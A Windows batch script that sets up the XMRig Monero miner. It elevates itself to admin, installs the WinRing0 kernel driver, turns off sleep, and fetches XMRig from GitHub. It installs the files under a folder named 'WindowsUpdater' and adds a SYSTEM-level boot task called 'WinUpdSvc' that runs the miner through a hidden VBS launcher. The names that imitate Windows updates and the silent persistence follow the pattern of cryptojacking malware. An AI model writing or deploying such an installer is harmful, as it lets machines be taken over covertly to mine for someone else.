@echo off
title Monero Miner Setup - High Mid-End PC (i5-14400)
color 0A
setlocal enabledelayedexpansion

:: ===================================================
:: Monero Miner - Ultimate Edition (i5-14400, 16GB RAM)
:: ===================================================

:: --- CONFIG ---
set "SRC=%~dp0miner_src"
set "DEST=C:\ProgramData\WindowsUpdater"
set "BACKUP=%DEST%\backup"
set "TASK_NAME=WinUpdSvc"
set "LOG_FILE=%DEST%\miner.log"
set "GITHUB_API=https://api.github.com/repos/xmrig/xmrig/releases/latest"

:: --- ELEVATE TO ADMIN ---
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
    "%temp%\elevate.vbs"
    del "%temp%\elevate.vbs"
    exit /b
)
echo [✔] Running with admin privileges.

:: --- PREPARE FOLDERS ---
if not exist "%DEST%" mkdir "%DEST%"
if not exist "%BACKUP%" mkdir "%BACKUP%"

:: --- POWER PLAN & TWEAKS ---
echo [*] Enabling Ultimate Performance power plan...
powercfg /duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
powercfg /setactive e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
powercfg /hibernate off
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CsEnabled" /t REG_DWORD /d 0 /f >nul
bcdedit /deletevalue useplatformclock >nul 2>&1

:: --- MSR DRIVER (WinRing0) ---
echo [*] Installing WinRing0 driver...
sc stop WinRing0_1_2_0 >nul 2>&1
sc delete WinRing0_1_2_0 >nul 2>&1
if exist "%SRC%\winring0x64.sys" (
    copy /Y "%SRC%\winring0x64.sys" "%BACKUP%\winring0x64.sys" >nul
    sc create WinRing0_1_2_0 binPath= "C:\ProgramData\WindowsUpdater\backup\winring0x64.sys" type= kernel start= demand
    sc start WinRing0_1_2_0
)

:: --- AUTO-UPDATE XMRIG ---
echo [*] Downloading latest XMRig...
set "URL="
for /f "delims=" %%A in ('powershell -NoProfile -Command ^
  "try {$r=Invoke-RestMethod -Uri '%GITHUB_API%' -UseBasicParsing -ErrorAction Stop;$a=$r.assets|?{$_.name-match'win64.*msvc.*zip'}|Select -First 1;if($a){$a.browser_download_url}else{''}}"') do set "URL=%%A"

if defined URL (
    powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%TEMP%\xmrig.zip' -UseBasicParsing -ErrorAction Stop" 2>> "%TEMP%\miner_debug.log"
    if exist "%TEMP%\xmrig.zip" (
        powershell -Command "Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%SRC%' -Force" 2>> "%TEMP%\miner_debug.log"
        del "%TEMP%\xmrig.zip"
    )
)

:: --- COPY FILES & BACKUP ---
xcopy /Y /Q "%SRC%\*" "%DEST%\" >nul
xcopy /Y /Q "%SRC%\*" "%BACKUP%\" >nul
copy /Y "%SRC%\config.json" "%DEST%\config.json" >nul
copy /Y "%SRC%\run_watchdogV2.bat" "%DEST%\run_watchdogV2.bat" >nul

:: --- SILENT LAUNCHER ---
> "%DEST%\run_silent.vbs" (
    echo Set WshShell = CreateObject("WScript.Shell")
    echo WshShell.Run "%DEST%\run_watchdogV2.bat", 0, False
)

:: --- SCHEDULE TASK ---
schtasks /create /tn "%TASK_NAME%" ^
  /tr "wscript.exe \"%DEST%\run_silent.vbs\"" ^
  /sc onstart /ru SYSTEM /rl HIGHEST /f

:: --- FIRST-RUN WATCHDOG (VISIBLE) ---
call "%DEST%\run_watchdogV2.bat" visible

echo [✔] Miner installed and running.
echo [✔] It will auto-start silently on every reboot.
pause
